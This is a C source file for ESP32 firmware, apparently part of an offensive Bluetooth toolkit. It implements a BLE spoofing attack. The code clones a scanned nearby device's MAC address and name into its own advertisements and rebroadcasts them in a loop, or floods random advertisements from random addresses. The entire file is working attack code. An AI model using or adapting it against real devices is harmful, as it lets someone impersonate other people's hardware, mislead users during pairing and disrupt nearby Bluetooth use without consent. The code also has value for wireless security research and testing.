#include "attack_bt_spoof.h"
#include "bt_scanner.h"
#include "attack_bt_spam.h"
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_random.h"
#include "host/ble_gap.h"
#include "host/ble_hs.h"
static const char *TAG="attack_bt_spoof";
static bool running=false;
static TaskHandle_t task=NULL;
static SemaphoreHandle_t sem=NULL;
static bt_spoof_config_t gcfg;
static void task_fn(void *arg){
    ESP_LOGI(TAG,"BT SPOOF start idx=%d all=%d", gcfg.target_idx, gcfg.all);
    uint8_t adv[31]; size_t len=0;
    bt_device_t *dev = NULL;
    if(!gcfg.all) dev = bt_scanner_get_device_by_idx(gcfg.target_idx);
    if(dev){
        // clone name and mac
        ble_hs_id_set_rnd(dev->addr);
        uint8_t name_len = strlen(dev->name);
        if(name_len>24) name_len=24;
        len=0;
        adv[len++]= name_len+1; adv[len++]=0x09; memcpy(&adv[len], dev->name, name_len); len+=name_len;
        adv[len++]= 0x02; adv[len++]=0x01; adv[len++]=0x06;
        ESP_LOGI(TAG,"Spoofing %s %02X:%02X:%02X:%02X:%02X:%02X", dev->name, dev->addr[5],dev->addr[4],dev->addr[3],dev->addr[2],dev->addr[1],dev->addr[0]);
    } else {
        // random spoof
        esp_fill_random(adv, 15); len=15; adv[0]=14; adv[1]=0xFF;
        uint8_t mac[6]; esp_fill_random(mac,6); mac[5]|=0xC0; ble_hs_id_set_rnd(mac);
    }
    int cnt=0;
    while(running){
        ble_gap_adv_stop(); vTaskDelay(pdMS_TO_TICKS(10));
        struct ble_gap_adv_params p={0};
        p.conn_mode=BLE_GAP_CONN_MODE_NON; p.disc_mode=BLE_GAP_DISC_MODE_GEN;
        p.itvl_min=0x20; p.itvl_max=0x30; p.channel_map=0x07;
        ble_gap_adv_set_data(adv,len);
        ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, 1000, &p, NULL, NULL);
        vTaskDelay(pdMS_TO_TICKS(1000));
        if(++cnt%10==0) ESP_LOGI(TAG,"Spoof adv %d", cnt);
        vTaskDelay(pdMS_TO_TICKS(100));
        if(cnt>1000) break;
    }
    ble_gap_adv_stop();
    running=false; task=NULL; if(sem) xSemaphoreGive(sem); vTaskDelete(NULL);
}
void attack_bt_spoof_init(void){
    if(sem==NULL) sem=xSemaphoreCreateBinary();
    if(!ble_hs_synced()){ attack_bt_spam_init(); int t=50; while(!ble_hs_synced()&&t-->0) vTaskDelay(pdMS_TO_TICKS(100));}
}
void attack_bt_spoof_start(bt_spoof_config_t *cfg){
    if(running){ ESP_LOGW(TAG,"already running"); return;}
    if(sem) xSemaphoreTake(sem,0);
    memcpy(&gcfg,cfg,sizeof(gcfg)); running=true;
    xTaskCreate(task_fn,"bt_spoof",4096,NULL,5,&task);
}
void attack_bt_spoof_stop(void){
    if(!running && !task) return;
    running=false;
    if(sem){ if(xSemaphoreTake(sem,pdMS_TO_TICKS(3000))!=pdTRUE){ if(task) vTaskDelete(task); task=NULL; } }
    else { vTaskDelay(pdMS_TO_TICKS(300)); if(task){ vTaskDelete(task); task=NULL; } }
    ble_gap_adv_stop(); ESP_LOGI(TAG,"BT Spoof stopped");
}
bool attack_bt_spoof_is_running(void){ return running; }
